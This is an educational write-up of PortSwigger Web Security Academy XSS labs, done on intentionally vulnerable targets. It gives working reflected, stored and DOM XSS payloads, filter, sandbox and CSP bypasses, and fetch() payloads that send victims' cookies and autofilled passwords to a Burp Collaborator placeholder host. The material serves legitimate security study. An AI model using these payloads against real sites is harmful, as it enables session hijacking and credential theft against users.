# XSS Writeup

**Author:** Ihtisham\
**Topic:** XSS (Cross-Site Scripting)\
**Platform:** PortSwigger Web Security Academy\
**Tools:** Burp Suite Professional, Web Browser

***

## Table of Contents

1. [Reflected XSS](xss-writeup.md#reflected-xss)
2. [Stored XSS](xss-writeup.md#stored-xss)
3. [DOM XSS](xss-writeup.md#dom-xss)
4. [Advanced XSS Contexts & Bypasses](xss-writeup.md#advanced-xss-contexts--bypasses)
5. [Exploiting XSS](xss-writeup.md#exploiting-xss)
6. [Bypassing CSP (Content Security Policy)](xss-writeup.md#bypassing-csp)

***

## Reflected XSS

Reflected XSS occurs when user input is immediately returned (reflected) by a web application in an error message, search result, or any other response without being made safe to render in the browser.

### Lab 1: Reflected XSS into HTML context with nothing encoded

**Goal:** Perform a cross-site scripting attack that calls the `alert` function. **Payload:** `<script>alert(1)</script>` **Execution:** Inject into the search bar. ![Screenshot](<../../.gitbook/assets/Unknown image (198)>) ![Screenshot](<../../.gitbook/assets/Unknown image (199)>) ![Screenshot](<../../.gitbook/assets/Unknown image (200)>)

### Lab 2: Reflected XSS into attribute with angle brackets HTML-encoded

**Goal:** Break out of the attribute and call the `alert` function. **Payload:** `" autofocus onfocus=alert(1) x="` **Execution:** Inject into the search bar to escape the `value=""` attribute. ![Screenshot](<../../.gitbook/assets/Unknown image (201)>) ![Screenshot](<../../.gitbook/assets/Unknown image (202)>)

### Lab 3: Reflected XSS into a JavaScript string with angle brackets HTML encoded

**Goal:** Break out of the JavaScript string and call `alert`. **Payload:** `'-alert(1)-'` **Execution:** Inject into the search bar. The input is reflected inside a JavaScript string, so we escape the quotes and subtract the alert function. ![Screenshot](<../../.gitbook/assets/Unknown image (203)>) ![Screenshot](<../../.gitbook/assets/Unknown image (204)>)

### Lab 4: Reflected XSS in canonical link tag

**Goal:** Inject an attribute that calls `alert` on the canonical link tag. **Payload:** `?'accesskey='x'onclick='alert(1)` **Execution:** Inject directly into the URL path. Press `ALT+SHIFT+X` (or `CTRL+ALT+X`) to trigger the access key. ![Screenshot](<../../.gitbook/assets/Unknown image (205)>) ![Screenshot](<../../.gitbook/assets/Unknown image (206)>)

***

## Stored XSS

Stored XSS (Persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

### Lab 5: Stored XSS into HTML context with nothing encoded

**Goal:** Submit a comment that calls the `alert` function when the blog post is viewed. **Payload:** `<script>alert(1)</script>` **Execution:** Submit into the blog comment form. ![Screenshot](<../../.gitbook/assets/Unknown image (207)>) ![Screenshot](<../../.gitbook/assets/Unknown image (208)>) ![Screenshot](<../../.gitbook/assets/Unknown image (209)>)

### Lab 6: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

**Goal:** Submit a comment that calls `alert` when the author's name is clicked. **Payload:** `javascript:alert(1)` **Execution:** Submit into the "Website" field of the comment form. ![Screenshot](<../../.gitbook/assets/Unknown image (210)>) ![Screenshot](<../../.gitbook/assets/Unknown image (211)>) ![Screenshot](<../../.gitbook/assets/Unknown image (212)>)

### Lab 7: Stored XSS into an SVG file

**Goal:** Upload an SVG image that calls `alert(1)`. **Payload:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(1);
   </script>
</svg>
```

**Execution:** Upload as the avatar image. ![Screenshot](<../../.gitbook/assets/Unknown image (213)>) ![Screenshot](<../../.gitbook/assets/Unknown image (214)>)

***

## DOM XSS

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`.

### Lab 8: DOM XSS in `document.write` sink using source `location.search`

**Payload:** `"><script>alert(1)</script>` **Execution:** The `search` parameter is written directly using `document.write`. ![Screenshot](<../../.gitbook/assets/Unknown image (215)>) ![Screenshot](<../../.gitbook/assets/Unknown image (216)>) ![Screenshot](<../../.gitbook/assets/Unknown image (217)>)

### Lab 9: DOM XSS in `innerHTML` sink using source `location.search`

**Payload:** `<img src=1 onerror=alert(1)>` **Execution:** The search parameter is inserted via `innerHTML`, which doesn't execute `<script>` tags, so we use `<img>` with an `onerror` handler. ![Screenshot](<../../.gitbook/assets/Unknown image (218)>) ![Screenshot](<../../.gitbook/assets/Unknown image (219)>) ![Screenshot](<../../.gitbook/assets/Unknown image (220)>)

### Lab 10: DOM XSS in jQuery anchor `href` attribute sink

**Payload:** `javascript:alert(1)` **Execution:** Passed into the `returnPath` parameter in the URL. ![Screenshot](<../../.gitbook/assets/Unknown image (221)>) ![Screenshot](<../../.gitbook/assets/Unknown image (222)>) ![Screenshot](<../../.gitbook/assets/Unknown image (223)>)

### Lab 11: DOM XSS in jQuery selector sink using a hashchange event

**Payload:** `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#<img src=x onerror=alert(1)>" onload="this.src+='<img src=x onerror=alert(1)>'"></iframe>` **Execution:** Deliver the exploit to the victim so it triggers the hashchange vulnerability. ![Screenshot](<../../.gitbook/assets/Unknown image (224)>) ![Screenshot](<../../.gitbook/assets/Unknown image (225)>) ![Screenshot](<../../.gitbook/assets/Unknown image (226)>)

### Lab 12: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Payload:** `{{$on.constructor('alert(1)')()}}` **Execution:** Inject into the search bar. AngularJS evaluates expressions wrapped in `{{ }}`. ![Screenshot](<../../.gitbook/assets/Unknown image (227)>) ![Screenshot](<../../.gitbook/assets/Unknown image (228)>) ![Screenshot](<../../.gitbook/assets/Unknown image (229)>)

### Lab 13: Reflected DOM XSS

**Payload:** `\"-alert(1)}//` **Execution:** The backend returns a JSON response containing our input, which is then passed to `eval()`. ![Screenshot](<../../.gitbook/assets/Unknown image (230)>) ![Screenshot](<../../.gitbook/assets/Unknown image (231)>) ![Screenshot](<../../.gitbook/assets/Unknown image (232)>)

### Lab 14: Stored DOM XSS

**Payload:** `<><img src=1 onerror=alert(1)>` **Execution:** Inject into the blog comment form. The `escapeHTML` function strips the first set of angle brackets, but leaves the second one intact. ![Screenshot](<../../.gitbook/assets/Unknown image (233)>) ![Screenshot](<../../.gitbook/assets/Unknown image (234)>)

***

## Advanced XSS Contexts & Bypasses

### Lab 15: Reflected XSS into HTML context with most tags and attributes blocked

**Payload (Tag Bypass):** `/?search=<body%20onresize=alert(document.cookie)>` **Execution:** Exploit the server using Burp Intruder to find an allowed tag/attribute combination (`body` and `onresize`). ![Screenshot](<../../.gitbook/assets/Unknown image (235)>) ![Screenshot](<../../.gitbook/assets/Unknown image (236)>)

### Lab 16: Reflected XSS into HTML context with all tags blocked except custom ones

**Payload:** `<xss id=x onfocus=alert(document.cookie) tabindex=1>#x` **Execution:** Use a custom tag `<xss>` and target the element via the URL hash to trigger the `onfocus` event automatically. ![Screenshot](<../../.gitbook/assets/Unknown image (237)>) ![Screenshot](<../../.gitbook/assets/Unknown image (238)>) ![Screenshot](<../../.gitbook/assets/Unknown image (239)>)

### Lab 17: Reflected XSS with some SVG markup allowed

**Payload:** `<svg><animatetransform onbegin=alert(1) attributeName=transform>` **Execution:** Use Burp Intruder to identify allowed SVG tags and attributes (`animatetransform` and `onbegin`). ![Screenshot](<../../.gitbook/assets/Unknown image (240)>) ![Screenshot](<../../.gitbook/assets/Unknown image (241)>)

***

## Exploiting XSS

### Lab 18: Exploiting cross-site scripting to steal cookies

**Payload:**

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

**Execution:** Submit via blog comment. Check Burp Collaborator to retrieve the victim's session cookie and hijack their session. ![Screenshot](<../../.gitbook/assets/Unknown image (242)>) ![Screenshot](<../../.gitbook/assets/Unknown image (243)>)

### Lab 19: Exploiting cross-site scripting to capture passwords

**Payload:**

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

**Execution:** Inject into the comment section to create a fake login form. The victim's password manager autofills the credentials, triggering the `onchange` event. ![Screenshot](<../../.gitbook/assets/Unknown image (244)>) ![Screenshot](<../../.gitbook/assets/Unknown image (245)>)

### Lab 20: Exploiting XSS to perform CSRF

**Execution:** The payload uses the victim's session (including their CSRF token) to submit a POST request that changes their email address. ![Screenshot](<../../.gitbook/assets/Unknown image (246)>) ![Screenshot](<../../.gitbook/assets/Unknown image (247)>)

***

## Lab 21: AngularJS sandbox escape

**Payload:**

```
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Execution:** The exploit uses `toString()` to bypass the sandbox without using quotes, overwriting the `charAt` function. ![Screenshot](<../../.gitbook/assets/Unknown image (248)>) ![Screenshot](<../../.gitbook/assets/Unknown image (249)>)

## Lab 22: AngularJS sandbox escape and CSP bypass

**Payload:**

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

**Execution:** Exploits the `ng-focus` event to bypass CSP, using `$event.composedPath()` to access the window object. ![Screenshot](<../../.gitbook/assets/Unknown image (250)>) ![Screenshot](<../../.gitbook/assets/Unknown image (251)>)

## Lab 23: Reflected XSS with event handlers and `href` attributes blocked

**Payload:**

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

**Execution:** Uses SVG `<animate>` to change the `href` attribute dynamically. ![Screenshot](<../../.gitbook/assets/Unknown image (252)>) ![Screenshot](<../../.gitbook/assets/Unknown image (253)>)

## Lab 24: Reflected XSS in a JavaScript URL with some characters blocked

**Payload:**

```javascript
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**Execution:** Uses `throw` with an arrow function to bypass the space restriction and trigger `onerror`. ![Screenshot](<../../.gitbook/assets/Unknown image (254)>) ![Screenshot](<../../.gitbook/assets/Unknown image (255)>)

## Lab 25: Reflected XSS with CSP bypass

**Payload:**

```html
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

**Execution:** The application reflects a user-controlled parameter directly into the `Content-Security-Policy` header. By injecting `;script-src-elem 'unsafe-inline'`, we overwrite the CSP rules to allow inline scripts. ![Screenshot](<../../.gitbook/assets/Unknown image (256)>) ![Screenshot](<../../.gitbook/assets/Unknown image (257)>) ![Screenshot](<../../.gitbook/assets/Unknown image (258)>) ![Screenshot](<../../.gitbook/assets/Unknown image (259)>) ![Screenshot](<../../.gitbook/assets/Unknown image (260)>) ![Screenshot](<../../.gitbook/assets/Unknown image (261)>) ![Screenshot](<../../.gitbook/assets/Unknown image (262)>) ![Screenshot](<../../.gitbook/assets/Unknown image (263)>)

***

> **Disclaimer:** This writeup is for educational purposes only. All labs were done on PortSwigger's intentionally vulnerable platform. Don't try this on real systems without permission.
